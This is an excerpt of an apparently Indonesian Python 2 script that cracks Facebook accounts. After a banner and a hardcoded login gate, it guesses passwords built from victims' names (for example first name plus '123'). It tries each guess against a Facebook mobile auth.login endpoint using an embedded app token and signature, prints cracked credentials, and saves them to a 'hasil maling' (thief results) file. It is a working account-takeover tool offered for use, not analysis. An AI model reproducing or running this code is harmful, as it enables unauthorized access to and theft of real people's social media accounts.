#!/usr/bin/python2
#coding=utf-8
#DEVILS HACK THE OFFICAL ROGRAMMER 
#FB RAMDANI ID 
...
logo = """
     ...
     \033[1;91m██████╔╝███████╗░░╚██╔╝░░██║███████╗           
     \033[1;92m╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝
	\033[1;47m \033[1;31m by : Ramdani ID \033[1;0m     
\033[0;95m╭════════════════════════════════════════════╮
...
\033[1;94m⊱══════════════════⊱═⊰NOTE⊱═⊰══════════════════⊰
                   \033[1;91mWARNING
\033[1;93mGUNAKAN AKUN BARU UNTUK LOGIN BILA TIDAK AKUN KALIAN AKAN DINONAKTIFKAN OLEH SI JUKI
\033[1;92mBILA ADA MASALAH PADA SCRIPT INI URUS AJA SENDIRI ANJING
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mSabar Anjing \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Login Berhasil " + username  #DEV User-JAV
            loop = 'false'
        else:
            print "Sandi Salah Bodoh"
            os.system('xdg-open https://m.facebook.com/DEVILS69JAVHD')
    else:
        print "Username Salah Bodoh"
        os.system('xdg-open https://m.facebook.com/DEVILS69JAVHD')
...
def login1():
	...
	try:
		...
		if 'checkpoint' in url:
			print("\n\x1b[1;97mAkun Lu Checkpoint Yang Sabar Ya")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email Salah Mungkin")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
	...
	def main(arg):
		...
		try:													
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass1 + ' | ' + b['name']
				    ...
				    pass2 = b['first_name'] + '123'										
			            ...
			            if 'access_token' in q:	
				            ...
				            print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass2 + ' | ' + b['name']
					       ...
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass3 + ' | ' + b['name']
						           ...
						           pass4 = b['last_name'] + '1234'											
						                   ...
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass4 + ' | ' + b['name']
...
data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
																...
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass9 + ' | ' + b['name']
				                                                                                                   cek = open("out/hasil maling.txt", "a")
